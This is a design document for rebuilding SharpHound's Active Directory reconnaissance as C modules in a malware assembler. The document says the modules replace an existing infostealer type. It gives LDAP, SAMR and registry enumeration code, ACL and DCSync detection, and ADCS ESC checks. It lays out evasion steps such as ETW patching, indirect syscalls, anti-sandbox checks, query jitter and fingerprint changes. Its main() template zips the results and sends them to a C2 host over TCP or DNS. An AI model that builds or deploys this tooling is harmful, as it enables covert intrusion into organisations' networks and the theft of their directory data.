# SharpHound Chunk Framework Implementation & Validation Plan

Reimplementation of SharpHound's AD reconnaissance capabilities as pure C chunks for the atelier chunk assembler. Replaces the infostealer malware type with domain-aware AD enumeration that outputs BloodHound-compatible JSON.

Reference: [docs/sharphound_analysis.md](sharphound_analysis.md)

---

# PART 1: Chunk Framework Implementation

## 1. Architecture Overview

The current chunk pipeline is: **recipe (YAML) → assembler.py → single .c → obfuscate → compile → deploy → validate**. AD recon fits this cleanly — LDAP/SAMR/NetAPI enumeration is all standard Win32, compilable with MinGW, and the output (BloodHound JSON) is just structured text that flows through the existing `emit`/exfil pipeline.

### Key Design Decision: Emit JSON, Not Flat Text

Current infostealer collectors emit flat text via `emitf("=== SECTION ===\r\n%s", data)`. AD recon must emit BloodHound v6 JSON. Two options:

1. **Emit JSON directly** — each AD collector writes JSON fragments; an `ad/json_builder.c` core chunk provides helpers (`json_obj_open`, `json_key_str`, `json_arr_push`, etc.) that write to a separate JSON buffer per entity type. At the end, a finalizer writes the meta block and wraps in `{"data":[...],"meta":{...}}`.

2. **Collect raw data, post-process** — collectors store structs in memory, a finalizer serializes everything to JSON at the end.

**Choice: Option 1 (stream JSON directly)**. Reasons:
- Matches the existing chunk pattern (collectors call emit functions)
- Avoids complex struct management and double-memory allocation
- Allows partial output even if the tool crashes mid-collection
- The JSON schema is regular enough for simple helper functions

### Chunk Category Layout

```
templates/chunks/
├── ad/                          # NEW — AD infrastructure
│   ├── ldap_client.c            # LDAP connection, bind, paged search
│   ├── sid_resolver.c           # SID ↔ name resolution + cache
│   ├── json_builder.c           # BloodHound v6 JSON output helpers
│   ├── dacl_parser.c            # Security descriptor / ACE parsing
│   ├── samr_client.c            # SAMR RPC for local group enumeration
│   └── zip_writer.c             # Minimal ZIP creation (deflate-store)
│
├── ad_collectors/               # NEW — AD enumeration collectors
│   ├── ad_users.c               # User enumeration via LDAP
│   ├── ad_groups.c              # Group enumeration + nested membership
│   ├── ad_computers.c           # Computer enumeration via LDAP
│   ├── ad_domains.c             # Domain properties + trusts
│   ├── ad_ous.c                 # OU/Container tree + GPO links
│   ├── ad_gpos.c                # GPO enumeration + SYSVOL parsing
│   ├── ad_acls.c                # ACL enumeration + abusable permission detection
│   ├── ad_sessions.c            # Session enum via NetSessionEnum (srvsvc)
│   ├── ad_localgroups.c         # Local group enum via SAMR (Admins/RDP/DCOM/PSRemote)
│   ├── ad_spn_targets.c         # SPN target relationships
│   ├── ad_certservices.c        # ADCS templates, CAs, enrollment rights
│   └── ad_registry_sessions.c   # Session enum via remote registry (winreg)
│
├── arch/
│   └── ad_recon.c               # NEW — AD recon main() template
│
└── recipes/
    ├── ad_recon_dconly.yaml      # LDAP-only, minimal noise
    ├── ad_recon_default.yaml     # Group+ACL+Props+Trusts+OU+Sessions+LocalGroups
    ├── ad_recon_full.yaml        # All collection methods
    ├── ad_recon_stealth.yaml     # Single-threaded, targeted, max evasion
    ├── ad_recon_sessions.yaml    # Session-focused (loop mode)
    └── ad_recon_certservices.yaml # ADCS-focused
```

---

## 2. Core Infrastructure Chunks (`ad/`)

### 2.1 ad/ldap_client.c

**Purpose**: LDAP connection lifecycle, paged search, attribute retrieval.

**API**: Links against `wldap32.dll` (available on all Windows since 2000).

**Functions provided**:

```c
// chunk: ad/ldap_client
// depends: (none)
// provides: ad_ldap_init, ad_ldap_close, ad_ldap_search, ad_ldap_get_str, ad_ldap_get_sid, ad_ldap_get_int, ad_ldap_get_sd
// headers: winldap.h, winber.h
// libs: wldap32

// Connect + Kerberos bind to nearest DC
static LDAP *g_ldap = NULL;
static char g_domain_dn[512];     // "DC=corp,DC=local"
static char g_domain_name[256];   // "CORP.LOCAL"

static int ad_ldap_init(void);                         // auto-discover DC, bind
static void ad_ldap_close(void);                       // unbind + cleanup

// Paged search — calls callback for each entry
typedef void (*ldap_entry_cb)(LDAP *ld, LDAPMessage *entry, void *ctx);
static int ad_ldap_search(
    const char *base_dn,           // NULL = domain root
    const char *filter,
    const char **attrs,            // NULL-terminated
    ULONG sd_flags,                // 0 = no SD, 0x05 = DACL+Owner
    ldap_entry_cb callback,
    void *ctx
);

// Attribute helpers
static int ad_ldap_get_str(LDAP *ld, LDAPMessage *e, const char *attr, char *out, int out_sz);
static int ad_ldap_get_sid(LDAP *ld, LDAPMessage *e, const char *attr, char *sid_str, int sid_sz);
static int ad_ldap_get_int(LDAP *ld, LDAPMessage *e, const char *attr, int *out);
static int ad_ldap_get_sd(LDAP *ld, LDAPMessage *e, PSECURITY_DESCRIPTOR *sd_out);
static int ad_ldap_get_multi(LDAP *ld, LDAPMessage *e, const char *attr, char ***out, int *count);
```

**Implementation notes**:
- DC discovery: `DsGetDcNameA(NULL, NULL, NULL, NULL, DS_RETURN_DNS_NAME, &info)` — auto-finds nearest DC
- Domain DN: derive from `defaultNamingContext` via rootDSE query
- Paging: `ldap_create_page_control(ld, 500, cookie, FALSE, &ctrl)` — 500 entries per page
- SDFlags: `ldap_create_sort_control` with OID `1.2.840.113556.1.4.801` and BER-encoded flags
- Kerberos bind: `ldap_bind_s(ld, NULL, NULL, LDAP_AUTH_NEGOTIATE)` — uses current user's token
- All queries through Kerberos = encrypted on wire, invisible to network inspection

**Evasion notes**:
- Change page size from SharpHound's 500 to 200 or 1000 (different fingerprint)
- Add random delay between pages (100-500ms)
- Query attributes in different order than SharpHound
- Split compound filters into multiple simpler queries (e.g., query users and computers separately instead of one massive OR filter)

### 2.2 ad/sid_resolver.c

**Purpose**: Resolve SIDs to display names, cache results, handle well-known SIDs.

```c
// chunk: ad/sid_resolver
// depends: ad/ldap_client
// provides: sid_resolve, sid_cache_init, sid_to_str
// headers: ntsecapi.h, sddl.h
// libs: advapi32

// Well-known SID table (S-1-5-18 = SYSTEM, S-1-5-32-544 = Administrators, etc.)
static const char *g_well_known_sids[][3];  // {sid_str, name, type}

// Hash map cache: SID string → (name, object_type)
#define SID_CACHE_SIZE 4096
typedef struct { char sid[128]; char name[256]; char type[16]; } sid_entry_t;
static sid_entry_t g_sid_cache[SID_CACHE_SIZE];

static void sid_cache_init(void);
static const char *sid_resolve(const char *sid_str, char *name_out, int name_sz);
static int sid_to_str(PSID sid, char *out, int out_sz);  // binary SID → "S-1-5-21-..."
```

**Implementation**:
- First check well-known SIDs table (50+ entries — no LDAP needed)
- Then check cache
- Then `LsaLookupSids2` for bulk resolution
- For foreign domain SIDs: LDAP query to foreign DC via trust if available
- Cache is a simple open-addressing hash map (no malloc, fixed-size)

### 2.3 ad/json_builder.c

**Purpose**: Write BloodHound v6 JSON without any external library. Writes directly into per-type output buffers.

```c
// chunk: ad/json_builder
// depends: (none)
// provides: jb_init, jb_finalize, jb_obj_open, jb_obj_close, jb_arr_open, jb_arr_close, jb_key_str, jb_key_int, jb_key_bool, jb_key_null, jb_key_arr_str, jb_raw
// headers: (none)

// One buffer per entity type
typedef enum {
    JB_USERS, JB_GROUPS, JB_COMPUTERS, JB_DOMAINS,
    JB_GPOS, JB_OUS, JB_CONTAINERS, JB_COUNT
} jb_type_t;

static const char *jb_type_names[] = {
    "users", "groups", "computers", "domains", "gpos", "ous", "containers"
};

typedef struct {
    char *buf;
    DWORD pos;
    DWORD cap;
    int count;         // entity count for meta block
    int first;         // comma tracking
} jb_buffer_t;

static jb_buffer_t g_jb[JB_COUNT];

static void jb_init(void);                                         // allocate all buffers, write opening {"data":[
static int jb_finalize(jb_type_t t, char **out, DWORD *out_len);  // write ],"meta":{...}}, return final buffer
static void jb_obj_open(jb_type_t t);                              // start new entity {
static void jb_obj_close(jb_type_t t);                             // close entity }
static void jb_arr_open(jb_type_t t, const char *key);             // "key": [
static void jb_arr_close(jb_type_t t);                             // ]
static void jb_key_str(jb_type_t t, const char *key, const char *val);
static void jb_key_int(jb_type_t t, const char *key, long long val);
static void jb_key_bool(jb_type_t t, const char *key, int val);
static void jb_key_null(jb_type_t t, const char *key);
static void jb_key_arr_str(jb_type_t t, const char *key, const char **vals, int count);
static void jb_raw(jb_type_t t, const char *raw, int len);
```

**JSON escaping**: Escape `"`, `\`, and control characters. No UTF-8 translation needed — AD attributes are UTF-8 already.

**Buffer management**: Start at 1MB per type, realloc to 2x when 75% full. Total memory: ~7MB initial for 7 types.

### 2.4 ad/dacl_parser.c

**Purpose**: Parse nTSecurityDescriptor, identify abusable ACEs, emit to JSON.

```c
// chunk: ad/dacl_parser
// depends: ad/sid_resolver, ad/json_builder
// provides: parse_dacl_to_json
// headers: aclapi.h, sddl.h
// libs: advapi32

// GUID constants for extended rights and property sets
static const GUID GUID_FORCE_CHANGE_PASSWORD;    // 00299570-246d-11d0-a768-00aa006e0529
static const GUID GUID_DS_REPL_GET_CHANGES;      // 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
static const GUID GUID_DS_REPL_GET_CHANGES_ALL;  // 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
static const GUID GUID_WRITE_MEMBER;             // bf9679c0-0de6-11d0-a285-00aa003049e2
static const GUID GUID_WRITE_SPN;                // f3a64788-5306-11d1-a9c5-0000f80367c1
static const GUID GUID_KEY_CREDENTIAL_LINK;      // 5b47d60f-6090-40b2-9f37-2a4de88f3063
static const GUID GUID_WRITE_ALLOWED_TO_ACT;     // 3f78c3e5-f79a-46bd-a0b8-9d18116ddc79
// ... more GUIDs for each abusable right

// Parse SD → emit Aces[] array into JSON builder
static void parse_dacl_to_json(
    PSECURITY_DESCRIPTOR sd,
    const char *object_sid,        // SID of the object this SD belongs to
    jb_type_t jb_type              // which JSON buffer to write to
);
```

**ACE filtering logic** (matches SharpHound):
1. Skip DENY ACEs (SharpHound ignores them)
2. Skip INHERITED ACEs where `IsInherited` flag is set (optional — include for completeness)
3. Skip ACEs where trustee is the object itself
4. Skip well-known uninteresting SIDs (SYSTEM, CREATOR OWNER on certain object types)
5. Map `ACCESS_MASK` + `ObjectType GUID` to BloodHound edge names:
   - `GENERIC_ALL` (0x10000000) → "GenericAll"
   - `ADS_RIGHT_DS_WRITE_PROP` + GUID_WRITE_MEMBER → "AddMember"
   - `ADS_RIGHT_DS_CONTROL_ACCESS` + GUID_FORCE_CHANGE_PASSWORD → "ForceChangePassword"
   - `ADS_RIGHT_DS_CONTROL_ACCESS` + GUID_DS_REPL_GET_CHANGES → record; if both GetChanges + GetChangesAll on same trustee → "DCSync" edge
   - etc.

### 2.5 ad/samr_client.c

**Purpose**: Enumerate local groups on remote computers via SAMR RPC.

```c
// chunk: ad/samr_client
// depends: ad/sid_resolver
// provides: samr_enum_local_group
// headers: lm.h, ntsecapi.h
// libs: samlib, netapi32

// Enumerate members of a local group by RID on a remote computer
// Returns array of SID strings
static int samr_enum_local_group(
    const char *computer_name,     // \\COMPUTER or DNS name
    DWORD rid,                     // 544=Admins, 555=RDP, 562=DCOM, 580=PSRemote
    char sids[][128],              // output: array of SID strings
    int max_sids,
    int *count
);
```

**Implementation**: Use `NetLocalGroupGetMembers` with level 2 (returns SIDs) as the simpler alternative to raw SAMR. Falls back to raw SAMR if NetLocalGroupGetMembers fails (non-English Windows where group name lookup fails).

For raw SAMR path:
1. Connect to `\\computer\IPC$` via `WNetAddConnection2A`
2. Open SAMR handle: `SamConnect`, `SamLookupDomainInSamServer("Builtin")`, `SamOpenDomain`, `SamOpenAlias(rid)`, `SamGetMembersInAlias`
3. Resolve SIDs via `LsaLookupSids2`

**samlib.dll exports used**: `SamConnect`, `SamLookupDomainInSamServer`, `SamOpenDomain`, `SamOpenAlias`, `SamGetMembersInAlias`, `SamFreeMemory`, `SamCloseHandle`. These are undocumented but stable — SharpHound uses them. Resolve dynamically via `GetProcAddress(LoadLibraryA("samlib.dll"), ...)`.

**Evasion**: Resolve APIs dynamically to avoid static import of `samlib.dll`. Space out SAMR connections with jitter (2-10s between hosts).

### 2.6 ad/zip_writer.c

**Purpose**: Create a ZIP archive from the JSON buffers for BloodHound import.

```c
// chunk: ad/zip_writer
// depends: (none)
// provides: zip_create, zip_add_file, zip_finalize
// headers: (none)

typedef struct { char *buf; DWORD pos; DWORD cap; } zip_ctx_t;

static zip_ctx_t *zip_create(void);
static void zip_add_file(zip_ctx_t *z, const char *filename, const char *data, DWORD len);
static int zip_finalize(zip_ctx_t *z, char **out, DWORD *out_len);
static void zip_free(zip_ctx_t *z);
```

**Implementation**: ZIP with STORE method only (no compression — keeps the code tiny, ~150 lines). BloodHound accepts uncompressed ZIPs. Format: local file headers → file data → central directory → end-of-central-directory record.

---

## 3. AD Collector Chunks (`ad_collectors/`)

Each collector follows the pattern:
1. Perform LDAP query (or SAMR/NetAPI call)
2. For each result, call `jb_obj_open(type)` → write Properties → write Aces/Members/etc → `jb_obj_close(type)`

### 3.1 ad_users.c — User Enumeration

```c
// chunk: ad_collectors/ad_users
// depends: ad/ldap_client, ad/json_builder, ad/dacl_parser, ad/sid_resolver
// provides: collect_ad_users

static void collect_ad_users(void) {
    // LDAP filter: (samaccounttype=805306368)
    // Attributes: sAMAccountName, distinguishedName, objectSid, userAccountControl,
    //   pwdLastSet, lastLogon, lastLogonTimestamp, whenCreated, servicePrincipalName,
    //   adminCount, email, title, description, displayName, homeDirectory, scriptPath,
    //   profilePath, sidHistory, allowedToDelegateTo,
    //   msDS-AllowedToActOnBehalfOfOtherIdentity, primaryGroupID, nTSecurityDescriptor
    // SDFlags: 0x05 (DACL + Owner)
}
```

**Evasion variant**: Split into 2 queries — first query gets basic attributes (no nTSecurityDescriptor), second query gets only objectSid + nTSecurityDescriptor. Different timing fingerprint from SharpHound's single-pass.

### 3.2 ad_groups.c — Group Enumeration + Nested Membership

```c
// chunk: ad_collectors/ad_groups
// depends: ad/ldap_client, ad/json_builder, ad/dacl_parser, ad/sid_resolver
// provides: collect_ad_groups

static void collect_ad_groups(void) {
    // LDAP filter: (|(samaccounttype=268435456)(samaccounttype=268435457)
    //               (samaccounttype=536870912)(samaccounttype=536870913))
    // Attributes: sAMAccountName, distinguishedName, objectSid, member, groupType,
    //   adminCount, description, whenCreated, primaryGroupID, nTSecurityDescriptor
    // SDFlags: 0x05
}
```

**Nested membership**: The `member` attribute gives direct members. For nested resolution, we track which members are groups (check `samAccountType`) and recursively expand. But we don't need to do this in the collector — BloodHound's graph engine handles transitive closure via `MemberOf` edges. We just need to emit the direct `Members[]` array for each group.

**primaryGroupID handling**: Users have a `primaryGroupID` (usually 513 = Domain Users). These users are NOT listed in the group's `member` attribute. Must be collected by querying `(primaryGroupID=<RID>)` for each group and adding them to Members[].

### 3.3 ad_computers.c — Computer Enumeration

```c
// chunk: ad_collectors/ad_computers
// depends: ad/ldap_client, ad/json_builder, ad/dacl_parser, ad/sid_resolver
// provides: collect_ad_computers

static void collect_ad_computers(void) {
    // LDAP filter: (&(sAMAccountType=805306369)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))
    // Attributes: sAMAccountName, dNSHostName, distinguishedName, objectSid,
    //   operatingSystem, operatingSystemVersion, pwdLastSet, lastLogonTimestamp,
    //   userAccountControl, servicePrincipalName, allowedToDelegateTo,
    //   msDS-AllowedToActOnBehalfOfOtherIdentity, msDS-HostServiceAccount,
    //   nTSecurityDescriptor
}
```

**Note**: LDAP gives us the computer list + properties. Local group membership and sessions come from separate collectors (ad_localgroups, ad_sessions) that iterate over the discovered computers.

### 3.4 ad_domains.c — Domain Properties + Trusts

```c
// chunk: ad_collectors/ad_domains
// depends: ad/ldap_client, ad/json_builder, ad/dacl_parser
// provides: collect_ad_domains

static void collect_ad_domains(void) {
    // Domain object: (objectclass=domain)
    // Attributes: distinguishedName, objectSid, name, msDS-Behavior-Version,
    //   machineAccountQuota, minPwdLength, pwdProperties, maxPwdAge, pwdHistoryLength,
    //   lockoutDuration, lockoutThreshold, nTSecurityDescriptor

    // Trusts: (objectclass=trusteddomain)
    // Attributes: trustAttributes, securityIdentifier, trustDirection, trustType,
    //   canonicalName, name
}
```

### 3.5 ad_ous.c — OU/Container Tree + GPO Links

```c
// chunk: ad_collectors/ad_ous
// depends: ad/ldap_client, ad/json_builder, ad/dacl_parser
// provides: collect_ad_ous

static void collect_ad_ous(void) {
    // Filter: (|(objectcategory=organizationalUnit)(objectClass=container))
    // Attributes: name, objectGUID, gpLink, gPOptions, objectClass, distinguishedName,
    //   nTSecurityDescriptor
    // SDFlags: 0x05

    // Parse gpLink to extract GPO GUIDs and enforcement status
    // Build ChildObjects[] by walking the DN tree
}
```

### 3.6 ad_gpos.c — GPO Enumeration

```c
// chunk: ad_collectors/ad_gpos
// depends: ad/ldap_client, ad/json_builder, ad/dacl_parser
// provides: collect_ad_gpos

static void collect_ad_gpos(void) {
    // Filter: (&(objectcategory=groupPolicyContainer)(flags=*)(name=*)(gpcfilesyspath=*))
    // Attributes: displayName, name, flags, gPCFileSysPath, nTSecurityDescriptor
}
```

**GPOLocalGroup processing** (optional, in full/default recipes): Read `GptTmpl.inf` and `Groups.xml` from SYSVOL via SMB to correlate GPO-enforced local group memberships. This creates edges (GPO → LocalAdmin on computers in linked OUs) without touching individual computers.

### 3.7 ad_acls.c — ACL-Only Collector

```c
// chunk: ad_collectors/ad_acls
// depends: ad/ldap_client, ad/json_builder, ad/dacl_parser, ad/sid_resolver
// provides: collect_ad_acls

static void collect_ad_acls(void) {
    // Combined filter targeting all ACL-relevant objects:
    // (|(samAccountType=805306368)(samAccountType=805306369)
    //   (samAccountType=268435456)(samAccountType=536870912)
    //   (objectClass=domain)(&(objectcategory=groupPolicyContainer)(flags=*))
    //   (objectcategory=organizationalUnit))
    // Attributes: objectSid, nTSecurityDescriptor
    // SDFlags: 0x05
}
```

**Note**: In the DCOnly recipe, this is included and provides ACL data without touching individual computers. In recipes that already include ad_users/ad_groups/ad_computers (which parse DACLs inline), this chunk is NOT needed — the Aces[] are emitted per-entity by those collectors. This chunk exists for the case where you want ACLs without full property enumeration.

### 3.8 ad_sessions.c — Session Enumeration

```c
// chunk: ad_collectors/ad_sessions
// depends: ad/ldap_client, ad/json_builder, ad/sid_resolver
// provides: collect_ad_sessions
// headers: lm.h
// libs: netapi32

static void collect_ad_sessions(void) {
    // For each computer discovered by ad_computers.c:
    //   1. TCP connect test on port 445 (timeout 2s)
    //   2. NetSessionEnum(computer, level 10) → sessions
    //   3. Filter: blank usernames, computer accounts, anonymous
    //   4. Emit HasSession edges to Computer JSON
}
```

**Stealth variant**: Only enumerate DCs + file servers (identified by users with `homeDirectory`/`scriptPath` attributes pointing to the server).

**Loop mode**: For the `ad_recon_sessions` recipe, this collector can loop with configurable interval + jitter, capturing session changes over time.

### 3.9 ad_localgroups.c — Local Group Enumeration via SAMR

```c
// chunk: ad_collectors/ad_localgroups
// depends: ad/samr_client, ad/json_builder, ad/sid_resolver
// provides: collect_ad_localgroups

static void collect_ad_localgroups(void) {
    // For each computer discovered by ad_computers.c:
    //   1. TCP connect test on port 445
    //   2. samr_enum_local_group(computer, 544, ...) → LocalAdmins
    //   3. samr_enum_local_group(computer, 555, ...) → RemoteDesktopUsers
    //   4. samr_enum_local_group(computer, 562, ...) → DcomUsers
    //   5. samr_enum_local_group(computer, 580, ...) → PSRemoteUsers
    //   6. Emit arrays to Computer JSON
}
```

### 3.10 ad_spn_targets.c — SPN Target Relationships

```c
// chunk: ad_collectors/ad_spn_targets
// depends: ad/ldap_client, ad/json_builder
// provides: collect_ad_spn_targets

static void collect_ad_spn_targets(void) {
    // Filter: (&(samaccounttype=805306368)(serviceprincipalname=*))
    // Parse SPN format: service/hostname:port
    // Map SPN hostnames to computer SIDs
    // Emit SPNTargets[] edges
}
```

### 3.11 ad_certservices.c — ADCS Enumeration

```c
// chunk: ad_collectors/ad_certservices
// depends: ad/ldap_client, ad/json_builder, ad/dacl_parser
// provides: collect_ad_certservices

static void collect_ad_certservices(void) {
    // Base DN: CN=Public Key Services,CN=Services,CN=Configuration,<domain_dn>
    //
    // Certificate Authorities:
    //   Filter: (objectClass=pKIEnrollmentService)
    //   Attributes: name, dNSHostName, certificateTemplates, cACertificate,
    //     nTSecurityDescriptor
    //
    // Certificate Templates:
    //   Filter: (objectClass=pKICertificateTemplate)
    //   Attributes: name, displayName, msPKI-Certificate-Name-Flag,
    //     msPKI-Enrollment-Flag, msPKI-Private-Key-Flag, msPKI-RA-Signature,
    //     pKIExtendedKeyUsage, msPKI-Certificate-Application-Policy,
    //     nTSecurityDescriptor
    //
    // ESC condition detection:
    //   ESC1: ENROLLEE_SUPPLIES_SUBJECT (flag 0x1) + Client Auth EKU + low-priv enrollment
    //   ESC2: Any Purpose EKU or no EKU
    //   ESC4: Low-priv WriteDacl/WriteOwner/GenericAll on template
    //   ESC6: CA has EDITF_ATTRIBUTESUBJECTALTNAME2 (from CARegistry)
}
```

### 3.12 ad_registry_sessions.c — Registry-Based Session Enumeration

```c
// chunk: ad_collectors/ad_registry_sessions
// depends: ad/json_builder, ad/sid_resolver
// provides: collect_ad_registry_sessions

static void collect_ad_registry_sessions(void) {
    // For each computer:
    //   1. RegConnectRegistryW(computer, HKEY_USERS, &hKey)
    //   2. RegEnumKeyExW(hKey, i, ...) → list subkeys
    //   3. Filter subkeys matching S-1-5-21-*-*-*-*$ regex
    //   4. Resolve SIDs → usernames
    //   5. Emit RegistrySessions[] to Computer JSON
}
```

---

## 4. Architecture Template

### arch/ad_recon.c

```c
// chunk: arch/ad_recon
// depends: ad/ldap_client, ad/json_builder, ad/zip_writer, exfil/*
// provides: main
// note: AD reconnaissance — LDAP bind → collect → JSON → ZIP → exfil

#ifndef CHUNK_ARCH_AD_RECON
#define CHUNK_ARCH_AD_RECON

int main(int argc, char *argv[]) {
    (void)argc; (void)argv;
    SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX);
    FreeConsole();
{{EVASION_INIT}}

    // Phase 1: LDAP init
    if (ad_ldap_init() != 0) return 1;
    sid_cache_init();
    jb_init();

    // Phase 2: Collect
    {{AD_COLLECTOR_CALLS}}

    // Phase 3: Finalize JSON + create ZIP
    ad_ldap_close();

    zip_ctx_t *zctx = zip_create();
    char ts[32];
    {
        SYSTEMTIME st;
        GetLocalTime(&st);
        wsprintfA(ts, "%04d%02d%02d%02d%02d%02d",
                  st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
    }

    for (int t = 0; t < JB_COUNT; t++) {
        char *json_data = NULL;
        DWORD json_len = 0;
        if (jb_finalize((jb_type_t)t, &json_data, &json_len) == 0 && json_len > 0) {
            char fname[128];
            wsprintfA(fname, "%s_%s.json", ts, jb_type_names[t]);
            zip_add_file(zctx, fname, json_data, json_len);
            free(json_data);
        }
    }

    char *zip_data = NULL;
    DWORD zip_len = 0;
    zip_finalize(zctx, &zip_data, &zip_len);

    // Phase 4: Exfil or write to disk
    if (zip_data && zip_len > 0) {
        // Option A: TCP exfil
        exfiltrate(C2_ADDR, C2_PORT, zip_data, zip_len);

        // Option B: Write to disk (for stealth recipes)
        // char outpath[MAX_PATH];
        // wsprintfA(outpath, "%%TEMP%%\\%s_BloodHound.zip", ts);
        // ExpandEnvironmentStringsA(outpath, outpath, MAX_PATH);
        // HANDLE hf = CreateFileA(outpath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        // DWORD written; WriteFile(hf, zip_data, zip_len, &written, NULL); CloseHandle(hf);
    }

    zip_free(zctx);
    return 0;
}

#endif
```

---

## 5. Assembler Changes

### 5.1 New Recipe Keys

Add `ad_collectors` as a new recipe key, processed between `collectors` and `c2`:

```python
# assembler.py — assembly order
api_resolve → evasion → process → core → ad (infra) → collectors → ad_collectors → keylogger → c2 → commands → exfil → persist → arch
```

The `ad` key holds infrastructure chunks (ldap_client, sid_resolver, etc.). The `ad_collectors` key holds enumeration chunks. Both are separate from `collectors` (which holds infostealer collectors) so recipes can mix them if needed.

### 5.2 New Placeholder: {{AD_COLLECTOR_CALLS}}

```python
AD_FN_MAP = {
    "ad_collectors/ad_users": "collect_ad_users",
    "ad_collectors/ad_groups": "collect_ad_groups",
    "ad_collectors/ad_computers": "collect_ad_computers",
    "ad_collectors/ad_domains": "collect_ad_domains",
    "ad_collectors/ad_ous": "collect_ad_ous",
    "ad_collectors/ad_gpos": "collect_ad_gpos",
    "ad_collectors/ad_acls": "collect_ad_acls",
    "ad_collectors/ad_sessions": "collect_ad_sessions",
    "ad_collectors/ad_localgroups": "collect_ad_localgroups",
    "ad_collectors/ad_spn_targets": "collect_ad_spn_targets",
    "ad_collectors/ad_certservices": "collect_ad_certservices",
    "ad_collectors/ad_registry_sessions": "collect_ad_registry_sessions",
}

def build_ad_collector_calls(ad_collectors: list[str]) -> str:
    calls = []
    for c in ad_collectors:
        fn = AD_FN_MAP.get(c, c.split("/")[-1])
        calls.append(f"    {fn}();")
    return "\n".join(calls)
```

In `assemble()`:
```python
ad_collectors = recipe.get("ad_collectors", [])
source = source.replace("{{AD_COLLECTOR_CALLS}}", build_ad_collector_calls(ad_collectors))
```

### 5.3 New Compile Flags

AD recon chunks need additional libraries:

```python
# In compile_mingw(), detect ad/ chunks and add:
ad_libs = ["-lwldap32", "-lnetapi32", "-lsecur32", "-lntdsapi"]
# wldap32 — LDAP client
# netapi32 — NetSessionEnum, NetLocalGroupGetMembers
# secur32 — SSPI/Kerberos (LDAP bind)
# ntdsapi — DsGetDcName
```

Detect from recipe:
```python
if recipe_data.get("ad") or recipe_data.get("ad_collectors"):
    cmd.extend(["-lwldap32", "-lnetapi32", "-lsecur32", "-lntdsapi"])
```

### 5.4 Computer List Sharing

The `ad_computers` collector discovers computers via LDAP. The `ad_sessions`, `ad_localgroups`, and `ad_registry_sessions` collectors need to iterate over those computers. Solution: a shared global array.

```c
// In ad/ldap_client.c or a new ad/computer_list.c:
#define MAX_COMPUTERS 8192
typedef struct { char hostname[256]; char sid[128]; } ad_computer_t;
static ad_computer_t g_computers[MAX_COMPUTERS];
static int g_computer_count = 0;

// ad_computers.c populates this during its LDAP query
// ad_sessions.c / ad_localgroups.c iterate over it
```

---

## 6. Recipe Definitions

### 6.1 ad_recon_dconly.yaml — LDAP Only, Minimal Noise

```yaml
name: ad_recon_dconly
description: DCOnly AD recon — LDAP queries to DC only, no computer contact

ad:
  - ad/ldap_client
  - ad/sid_resolver
  - ad/json_builder
  - ad/dacl_parser
  - ad/zip_writer

ad_collectors:
  - ad_collectors/ad_domains
  - ad_collectors/ad_users
  - ad_collectors/ad_groups
  - ad_collectors/ad_computers
  - ad_collectors/ad_ous
  - ad_collectors/ad_gpos
  - ad_collectors/ad_acls
  - ad_collectors/ad_spn_targets

evasion:
  - evasion/behavioral_pacing
  - evasion/entropy_pad

exfil: exfil/tcp_direct
arch: arch/ad_recon

vars:
  C2_IP: "10.0.2.2"
  C2_PORT: "9001"
```

**Noise level**: Low. Only LDAP queries to the DC. No SMB connections to individual computers.

### 6.2 ad_recon_default.yaml — SharpHound Default Equivalent

```yaml
name: ad_recon_default
description: Default AD recon — matches SharpHound --CollectionMethods Default

ad:
  - ad/ldap_client
  - ad/sid_resolver
  - ad/json_builder
  - ad/dacl_parser
  - ad/samr_client
  - ad/zip_writer

ad_collectors:
  - ad_collectors/ad_domains
  - ad_collectors/ad_users
  - ad_collectors/ad_groups
  - ad_collectors/ad_computers
  - ad_collectors/ad_ous
  - ad_collectors/ad_gpos
  - ad_collectors/ad_acls
  - ad_collectors/ad_spn_targets
  - ad_collectors/ad_sessions
  - ad_collectors/ad_localgroups

evasion:
  - evasion/behavioral_pacing
  - evasion/sleep_jitter
  - evasion/entropy_pad

exfil: exfil/tcp_direct
arch: arch/ad_recon

vars:
  C2_IP: "10.0.2.2"
  C2_PORT: "9001"
```

### 6.3 ad_recon_full.yaml — All Collection Methods

```yaml
name: ad_recon_full
description: Full AD recon — all collection methods including ADCS

ad:
  - ad/ldap_client
  - ad/sid_resolver
  - ad/json_builder
  - ad/dacl_parser
  - ad/samr_client
  - ad/zip_writer

ad_collectors:
  - ad_collectors/ad_domains
  - ad_collectors/ad_users
  - ad_collectors/ad_groups
  - ad_collectors/ad_computers
  - ad_collectors/ad_ous
  - ad_collectors/ad_gpos
  - ad_collectors/ad_acls
  - ad_collectors/ad_spn_targets
  - ad_collectors/ad_sessions
  - ad_collectors/ad_localgroups
  - ad_collectors/ad_certservices
  - ad_collectors/ad_registry_sessions

evasion:
  - evasion/behavioral_pacing
  - evasion/sleep_jitter
  - evasion/entropy_pad
  - evasion/etw_patch

exfil: exfil/tcp_direct
arch: arch/ad_recon

vars:
  C2_IP: "10.0.2.2"
  C2_PORT: "9001"
```

### 6.4 ad_recon_stealth.yaml — Maximum Stealth

```yaml
name: ad_recon_stealth
description: Stealth AD recon — single-threaded, DCOnly, targeted sessions, max evasion

ad:
  - ad/ldap_client
  - ad/sid_resolver
  - ad/json_builder
  - ad/dacl_parser
  - ad/zip_writer

ad_collectors:
  - ad_collectors/ad_domains
  - ad_collectors/ad_users
  - ad_collectors/ad_groups
  - ad_collectors/ad_computers
  - ad_collectors/ad_ous
  - ad_collectors/ad_gpos

evasion:
  - evasion/behavioral_pacing
  - evasion/sleep_jitter
  - evasion/entropy_pad
  - evasion/etw_patch
  - evasion/ret_spoof
  - evasion/anti_sandbox
  - evasion/triggered_exec
  - evasion/indirect_syscall

exfil: exfil/dns_exfil
arch: arch/ad_recon

vars:
  C2_IP: "10.0.2.2"
  C2_PORT: "9001"
  AD_STEALTH: "1"
  AD_PAGE_SIZE: "200"
  AD_QUERY_JITTER_MS: "500"
```

**Key differences**: No session/localgroup/SAMR enumeration (no computer contact). DNS exfil instead of TCP. Larger jitter. All evasion layers. `AD_STEALTH=1` flag makes LDAP queries split and slower. Smaller page size (200 vs 500).

### 6.5 ad_recon_sessions.yaml — Session-Focused (Loop Mode)

```yaml
name: ad_recon_sessions
